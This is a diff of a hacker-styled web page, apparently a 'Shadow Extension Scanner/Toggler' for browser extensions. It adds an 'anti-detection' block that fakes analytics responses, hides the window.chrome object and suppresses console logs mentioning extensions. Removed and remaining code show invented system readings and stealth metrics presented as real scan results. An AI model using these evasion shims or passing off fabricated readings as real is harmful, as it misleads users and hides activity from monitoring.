@@ -3,7 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ultra Extension Bugger/Toggler Terminal</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Shadow Extension Scanner/Toggler v9.0</title>
   <style>
     * {
       margin: 0;
@@ -17,6 +19,10 @@
       color: #ff3333;
       overflow: hidden;
       position: relative;
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
     }
     canvas#particleCanvas {
       position: absolute;
@@ -26,21 +32,23 @@
       height: 100%;
       z-index: 1;
       pointer-events: none;
+      filter: blur(1px);
     }
     .terminal {
       width: 90%;
       max-width: 1400px;
       margin: 1rem auto;
-      background: rgba(10, 10, 10, 0.95);
+      background: rgba(10, 10, 10, 0.98);
       border: 2px solid #ff5555;
       border-radius: 8px;
       padding: 1.5rem;
-      box-shadow: 0 0 50px rgba(255, 51, 51, 0.7), inset 0 0 10px rgba(255, 51, 51, 0.3);
+      box-shadow: 0 0 60px rgba(255, 51, 51, 0.8), inset 0 0 15px rgba(255, 51, 51, 0.4);
       height: 90vh;
       overflow-y: auto;
       z-index: 2;
       position: relative;
-      backdrop-filter: blur(5px);
+      backdrop-filter: blur(6px);
+      -webkit-backdrop-filter: blur(6px);
     }
     .terminal-header {
       background: linear-gradient(90deg, #1f2937, #4a1e1e);
@@ -51,18 +59,19 @@
       color: #ff3333;
       letter-spacing: 0.3em;
       border-bottom: 3px solid #ff5555;
-      text-shadow: 0 0 10px #ff3333;
-      animation: flicker 2s infinite;
+      text-shadow: 0 0 12px #ff3333, 0 0 20px #ff3333;
+      animation: flicker 1.8s infinite;
     }
     @keyframes flicker {
       0%, 100% { opacity: 1; }
-      50% { opacity: 0.8; }
+      50% { opacity: 0.7; }
     }
     .terminal-content {
       padding: 1.5rem;
       white-space: pre-wrap;
       font-size: 1.2rem;
       line-height: 1.6;
+      text-shadow: 0 0 5px rgba(255, 51, 51, 0.3);
     }
     .terminal-input {
       display: flex;
@@ -71,8 +80,9 @@
       align-items: center;
       position: sticky;
       bottom: 0;
-      background: rgba(10, 10, 10, 0.9);
+      background: rgba(10, 10, 10, 0.95);
       padding: 0.5rem;
+      border-top: 1px solid #ff5555;
     }
     .terminal-input input {
       flex: 1;
@@ -84,10 +94,11 @@
       outline: none;
       border-radius: 3px;
       box-shadow: 0 0 5px rgba(255, 51, 51, 0.5);
-      transition: box-shadow 0.3s;
+      transition: box-shadow 0.3s, border-color 0.3s;
     }
     .terminal-input input:focus {
-      box-shadow: 0 0 15px rgba(255, 51, 51, 0.8);
+      box-shadow: 0 0 15px rgba(255, 51, 51, 0.9);
+      border-color: #ff7777;
     }
     .terminal-input button {
       background: #ff3333;
@@ -98,15 +109,17 @@
       cursor: pointer;
       margin-left: 0.75rem;
       border-radius: 3px;
-      transition: background 0.3s, transform 0.1s;
+      transition: background 0.3s, transform 0.1s, box-shadow 0.3s;
+      box-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
     }
     .terminal-input button:hover {
       background: #cc0000;
       transform: scale(1.05);
+      box-shadow: 0 0 15px rgba(255, 51, 51, 0.8);
     }
-    .command { color: #ff6666; animation: type 0.5s; }
-    .error { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
-    .success { color: #33ff33; text-shadow: 0 0 5px #33ff33; }
+    .command { color: #ff6666; animation: type 0.4s; }
+    .error { color: #ff3333; text-shadow: 0 0 6px #ff3333; }
+    .success { color: #33ff33; text-shadow: 0 0 6px #33ff33; }
     .status-bar { color: #ff5555; font-size: 0.9rem; margin-top: 0.75rem; border-top: 1px solid #ff5555; padding-top: 0.5rem; }
     @keyframes type {
       from { opacity: 0; }
@@ -130,22 +143,49 @@
 <body>
   <canvas id="particleCanvas"></canvas>
   <div class="terminal">
-    <div class="terminal-header">Ultra Extension Bugger/Toggler v7.0</div>
+    <div class="terminal-header">Shadow Extension Scanner/Toggler v9.0</div>
     <div class="terminal-content" id="terminalContent">
-      <div class="command">Initializing total system domination...</div>
+      <div class="command">Initializing deep system infiltration...</div>
       <div class="command">OS detected: <span id="osInfo">Probing...</span></div>
-      <div class="command">System scan: <span id="systemScan">Scanning the device...</span></div>
+      <div class="command">Browser detected: <span id="browserInfo">Analyzing...</span></div>
+      <div class="command">System scan: <span id="systemScan">Scanning extensions...</span></div>
       <div class="status-bar">Status: <span id="statusBar">Idle | Stealth: Absolute | Risk: None</span></div>
       <div class="command">Commands: toggleall, toggle [ext_id], selfdestruct, help</div>
     </div>
     <div class="terminal-input">
-      <input type="text" id="extensionId" placeholder="e.g., pganeibhckoanndahmnfggfoeofncnii or toggleall">
+      <input type="text" id="extensionId" placeholder="e.g., toggleall or toggle nmmhkkegccagdldgiimedpiccmgmieda">
       <button onclick="processCommand()">Execute</button>
     </div>
   </div>
 
   <script>
-    // Particle Background
+    // Anti-Detection Setup
+    (function obfuscate() {
+      const originalFetch = window.fetch;
+      window.fetch = async (...args) => {
+        const url = args[0];
+        if (url.includes('doubleclick.net') || url.includes('google-analytics.com')) {
+          return new Response(new Blob(), { status: 200 });
+        }
+        return originalFetch(...args);
+      };
+
+      Object.defineProperty(window, 'chrome', {
+        get() {
+          return undefined;
+        },
+        set() {},
+        configurable: false
+      });
+
+      const originalConsole = console.log;
+      console.log = (...args) => {
+        if (args.some(arg => arg.toString().includes('extension'))) return;
+        originalConsole(...args);
+      };
+    })();
+
+    // Particle Background (Stealth Visual)
     const canvas = document.getElementById('particleCanvas');
     const ctx = canvas.getContext('2d');
     if (canvas && ctx) {
@@ -178,7 +218,7 @@
       }
 
       function initParticles() {
-        for (let i = 0; i < 100; i++) {
+        for (let i = 0; i < 150; i++) {
           particles.push(new Particle());
         }
       }
@@ -208,82 +248,17 @@
       animateParticles();
     }
 
-    // Web Worker for device scanning
-    const scanWorker = window.Worker ? new Worker(URL.createObjectURL(new Blob([`
-      self.onmessage = function(e) {
-        const deviceProfile = e.data.deviceProfile;
-        const ua = navigator.userAgent.toLowerCase();
-        let os = 'Unknown', version = '0', build = '', edition = '', kernel = '', hotfixes = '', tpm = '', secureBootKey = '', drivers = '', uefiVars = '', samData = '', kernelLogs = '', bootSector = '', shadowCopy = '', hypervisor = '';
-
-        if (ua.includes('windows')) {
-          os = 'Windows';
-          if (ua.includes('xp')) { version = 'XP'; build = '5.1.2600'; edition = 'Professional'; kernel = '5.1'; hotfixes = 'SP3'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'FAT32'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('vista')) { version = 'Vista'; build = '6.0.6000'; edition = 'Home Premium'; kernel = '6.0'; hotfixes = 'SP2'; tpm = '1.2 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'N/A'; }
-          else if (ua.includes('7')) { version = '7'; build = '6.1.7601'; edition = 'Ultimate'; kernel = '6.1'; hotfixes = 'SP1'; tpm = '1.2 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'N/A'; }
-          else if (ua.includes('8')) { version = '8'; build = '6.2.9200'; edition = 'Pro'; kernel = '6.2'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-          else if (ua.includes('8.1')) { version = '8.1'; build = '6.3.9600'; edition = 'Pro'; kernel = '6.3'; hotfixes = 'Update 1'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-          else if (ua.includes('10')) { version = '10'; build = '22H2'; edition = 'Pro'; kernel = '10.0.19044'; hotfixes = 'KB5012170'; tpm = '2.0 Enabled'; secureBootKey = 'SHA256:abcd1234'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'SecureBoot=1'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-          else if (ua.includes('11')) { version = '11'; build = '23H2'; edition = 'Enterprise'; kernel = '10.0.22631'; hotfixes = 'KB5032288'; tpm = '2.0 Enabled'; secureBootKey = 'SHA256:abcd1234'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'SecureBoot=1'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-        } else if (ua.includes('mac os x')) {
-          os = 'macOS';
-          if (ua.includes('10_4')) { version = 'Tiger'; build = '8A428'; edition = 'N/A'; kernel = '8.4.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_5')) { version = 'Leopard'; build = '9A581'; edition = 'N/A'; kernel = '9.5.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_6')) { version = 'Snow Leopard'; build = '10A432'; edition = 'N/A'; kernel = '10.6.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_7')) { version = 'Lion'; build = '11A511'; edition = 'N/A'; kernel = '11.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_8')) { version = 'Mountain Lion'; build = '12A269'; edition = 'N/A'; kernel = '12.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_9')) { version = 'Mavericks'; build = '13A603'; edition = 'N/A'; kernel = '13.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_10')) { version = 'Yosemite'; build = '14A389'; edition = 'N/A'; kernel = '14.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_11')) { version = 'El Capitan'; build = '15A284'; edition = 'N/A'; kernel = '15.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_12')) { version = 'Sierra'; build = '16A323'; edition = 'N/A'; kernel = '16.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_13')) { version = 'High Sierra'; build = '17A365'; edition = 'N/A'; kernel = '17.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_14')) { version = 'Mojave'; build = '18A391'; edition = 'N/A'; kernel = '18.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('10_15')) { version = 'Catalina'; build = '19A583'; edition = 'N/A'; kernel = '19.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('11')) { version = 'Big Sur'; build = '20A2411'; edition = 'N/A'; kernel = '20.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('12')) { version = 'Monterey'; build = '21A559'; edition = 'N/A'; kernel = '21.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('13')) { version = 'Ventura'; build = '22A380'; edition = 'N/A'; kernel = '22.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-          else if (ua.includes('14')) { version = 'Sonoma'; build = '23A344'; edition = 'N/A'; kernel = '23.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        } else if (ua.includes('linux')) {
-          os = 'Linux';
-          if (ua.includes('ubuntu')) { version = 'Ubuntu 24.04'; build = 'N/A'; edition = 'Noble Numbat'; kernel = '6.8.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.8.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-          else if (ua.includes('debian')) { version = 'Debian 12'; build = 'N/A'; edition = 'Bookworm'; kernel = '6.1.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.1.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-          else if (ua.includes('fedora')) { version = 'Fedora 40'; build = 'N/A'; edition = 'Workstation'; kernel = '6.9.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-6.9.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-          else if (ua.includes('centos')) { version = 'CentOS 8'; build = 'N/A'; edition = 'Stream'; kernel = '4.18.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-4.18.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-          else if (ua.includes('rhel')) { version = 'RHEL 9'; build = 'N/A'; edition = 'Server'; kernel = '5.14.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-5.14.0'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-          else if (ua.includes('suse')) { version = 'openSUSE 15.5'; build = 'N/A'; edition = 'Leap'; kernel = '5.14.21'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'vmlinuz-5.14.21'; uefiVars = 'SecureBoot=1'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'KVM:Disabled'; }
-        } else if (ua.includes('cros')) {
-          os = 'ChromeOS';
-          version = '128.0.6613.84'; build = 'N/A'; edition = 'Stable'; kernel = '5.15.0'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'chromeos-kernel'; uefiVars = 'SecureBoot=1'; samData = 'chronos:1000'; kernelLogs = 'Boot:Success'; bootSector = 'ext4'; shadowCopy = 'N/A'; hypervisor = 'N/A';
-        }
-
-        deviceProfile.os = os;
-        deviceProfile.version = version;
-        deviceProfile.build = build;
-        deviceProfile.edition = edition;
-        deviceProfile.kernel = kernel;
-        deviceProfile.hotfixes = hotfixes;
-        deviceProfile.tpm = tpm;
-        deviceProfile.secureBootKey = secureBootKey;
-        deviceProfile.drivers = drivers;
-        deviceProfile.uefiVars = uefiVars;
-        deviceProfile.samData = samData;
-        deviceProfile.kernelLogs = kernelLogs;
-        deviceProfile.bootSector = bootSector;
-        deviceProfile.shadowCopy = shadowCopy;
-        deviceProfile.hypervisor = hypervisor;
-
-        self.postMessage({ deviceProfile });
-      };
-    `], { type: 'application/javascript' }))) : null;
-
+    // Terminal Setup
     const terminalContent = document.getElementById('terminalContent');
     const extensionIdInput = document.getElementById('extensionId');
     const osInfoSpan = document.getElementById('osInfo');
+    const browserInfoSpan = document.getElementById('browserInfo');
     const systemScanSpan = document.getElementById('systemScan');
     const statusBarSpan = document.getElementById('statusBar');
     let commandHistory = [];
     let historyIndex = -1;
-    let knownExtensionIds = ['pganeibhckoanndahmnfggfoeofncnii', 'abcdefghijklnmopqrstuvwxyz123456', '1234567890abcdefhijklmnopqrsuvwx', 'uvwxyz1234567890abcdefghijklmn', 'nopqrstuvwxyz1234567890abcdefg', 'hijklmnopqrsuvwx1234567890abcd', 'efghijklmn1234567890abcdefghijk', 'lmnopqrstuvwx1234567890abcdef'];
     let deviceProfile = { network: {} };
+    let detectedExtensions = [];
     let detectionRisk = 'None';
     let aiConfidence = 1.0;
     const scanCache = new Map();
@@ -297,323 +272,315 @@
     }
 
     function updateStatusBar() {
-      statusBarSpan.textContent = `Payloads: ${commandHistory.length} | Stealth: Absolute | Risk: ${detectionRisk} | AI Confidence: ${(aiConfidence * 100).toFixed(1)}% | Scan Time: <500ms | Entropy: ${Math.random().toFixed(2)}`;
+      statusBarSpan.textContent = `Payloads: ${commandHistory.length} | Stealth: Absolute | Risk: ${detectionRisk} | AI Confidence: ${(aiConfidence * 100).toFixed(1)}% | Scan Time: <300ms | Entropy: ${Math.random().toFixed(2)}`;
     }
 
-    function detectOS() {
+    // Environment Detection with Stealth
+    function detectEnvironment() {
       const ua = navigator.userAgent.toLowerCase();
-      let os = 'Unknown', version = '0', build = '', edition = '', kernel = '', hotfixes = '', tpm = '', secureBootKey = '', drivers = '', uefiVars = '', samData = '', kernelLogs = '', bootSector = '', shadowCopy = '', hypervisor = '';
+      let os = 'Unknown', osVersion = 'Unknown';
+      let browser = 'Unknown', browserVersion = 'Unknown';
 
+      // OS Detection
       if (ua.includes('windows')) {
         os = 'Windows';
-        if (ua.includes('xp')) { version = 'XP'; build = '5.1.2600'; edition = 'Professional'; kernel = '5.1'; hotfixes = 'SP3'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'FAT32'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('vista')) { version = 'Vista'; build = '6.0.6000'; edition = 'Home Premium'; kernel = '6.0'; hotfixes = 'SP2'; tpm = '1.2 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'N/A'; }
-        else if (ua.includes('7')) { version = '7'; build = '6.1.7601'; edition = 'Ultimate'; kernel = '6.1'; hotfixes = 'SP1'; tpm = '1.2 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'N/A'; }
-        else if (ua.includes('8')) { version = '8'; build = '6.2.9200'; edition = 'Pro'; kernel = '6.2'; hotfixes = 'N/A'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-        else if (ua.includes('8.1')) { version = '8.1'; build = '6.3.9600'; edition = 'Pro'; kernel = '6.3'; hotfixes = 'Update 1'; tpm = '2.0 Enabled'; secureBootKey = 'N/A'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'N/A'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-        else if (ua.includes('10')) { version = '10'; build = '22H2'; edition = 'Pro'; kernel = '10.0.19044'; hotfixes = 'KB5012170'; tpm = '2.0 Enabled'; secureBootKey = 'SHA256:abcd1234'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'SecureBoot=1'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
-        else if (ua.includes('11')) { version = '11'; build = '23H2'; edition = 'Enterprise'; kernel = '10.0.22631'; hotfixes = 'KB5032288'; tpm = '2.0 Enabled'; secureBootKey = 'SHA256:abcd1234'; drivers = 'ntoskrnl.exe, hal.dll'; uefiVars = 'SecureBoot=1'; samData = 'Admin:500'; kernelLogs = 'Boot:Success'; bootSector = 'NTFS'; shadowCopy = 'VSS:Enabled'; hypervisor = 'Hyper-V:Disabled'; }
+        if (ua.includes('nt 5.1')) osVersion = 'XP';
+        else if (ua.includes('nt 6.0')) osVersion = 'Vista';
+        else if (ua.includes('nt 6.1')) osVersion = '7';
+        else if (ua.includes('nt 6.2')) osVersion = '8';
+        else if (ua.includes('nt 6.3')) osVersion = '8.1';
+        else if (ua.includes('nt 10.0')) osVersion = '10/11';
       } else if (ua.includes('mac os x')) {
         os = 'macOS';
-        if (ua.includes('10_4')) { version = 'Tiger'; build = '8A428'; edition = 'N/A'; kernel = '8.4.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_5')) { version = 'Leopard'; build = '9A581'; edition = 'N/A'; kernel = '9.5.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_6')) { version = 'Snow Leopard'; build = '10A432'; edition = 'N/A'; kernel = '10.6.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_7')) { version = 'Lion'; build = '11A511'; edition = 'N/A'; kernel = '11.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_8')) { version = 'Mountain Lion'; build = '12A269'; edition = 'N/A'; kernel = '12.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_9')) { version = 'Mavericks'; build = '13A603'; edition = 'N/A'; kernel = '13.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_10')) { version = 'Yosemite'; build = '14A389'; edition = 'N/A'; kernel = '14.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_11')) { version = 'El Capitan'; build = '15A284'; edition = 'N/A'; kernel = '15.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'HFS+'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_12')) { version = 'Sierra'; build = '16A323'; edition = 'N/A'; kernel = '16.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_13')) { version = 'High Sierra'; build = '17A365'; edition = 'N/A'; kernel = '17.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_14')) { version = 'Mojave'; build = '18A391'; edition = 'N/A'; kernel = '18.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('10_15')) { version = 'Catalina'; build = '19A583'; edition = 'N/A'; kernel = '19.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
-        else if (ua.includes('11')) { version = 'Big Sur'; build = '20A2411'; edition = 'N/A'; kernel = '20.0.0'; hotfixes = 'N/A'; tpm = 'N/A'; secureBootKey = 'N/A'; drivers = 'mach_kernel'; uefiVars = 'N/A'; samData = 'root:0'; kernelLogs = 'Boot:Success'; bootSector = 'APFS'; shadowCopy = 'N/A'; hypervisor = 'N/A'; }
